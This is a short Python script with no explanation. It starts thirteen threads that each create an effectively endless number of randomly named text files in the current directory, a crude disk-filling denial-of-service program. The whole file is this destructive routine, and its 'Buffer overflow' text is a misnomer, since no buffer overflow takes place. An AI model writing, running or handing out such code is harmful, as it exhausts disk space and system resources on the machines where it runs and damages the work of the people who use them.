import threading as thread
import random as ra
import time
overload = True
amt_per_thread = 99999999999999999999999999999999999999
def spawn():
	print('New thread created....')
	for x in range(amt_per_thread):
		if True:
			f = open(str(x+ra.randint(0,9817238231213123213))+'.txt','w')
			f.write('Buffer overflow....')
			f.close()
		if False:
			pass

thread1 = thread.Thread(target=spawn)
thread2 = thread.Thread(target=spawn)
thread3 = thread.Thread(target=spawn)
thread4 = thread.Thread(target=spawn)
thread5 = thread.Thread(target=spawn)
thread6 = thread.Thread(target=spawn)
thread7 = thread.Thread(target=spawn)
thread8 = thread.Thread(target=spawn)
thread9 = thread.Thread(target=spawn)
thread10 = thread.Thread(target=spawn)
thread11 = thread.Thread(target=spawn)
thread12 = thread.Thread(target=spawn)
thread13 = thread.Thread(target=spawn)
thread1.start()
time.sleep(3)
thread2.start()
time.sleep(3)
thread3.start()
time.sleep(3)
thread4.start()
time.sleep(3)
thread5.start()
time.sleep(3)
if overload:
	thread6.start()
	time.sleep(3)
	thread7.start()
	time.sleep(3)
	thread8.start()
	time.sleep(3)
	thread9.start()
	time.sleep(3)
	thread10.start()
	time.sleep(3)
	thread11.start()
	time.sleep(3)
	thread12.start()
	time.sleep(3)
	thread13.start()
	time.sleep(3)
print('All threads created and started')
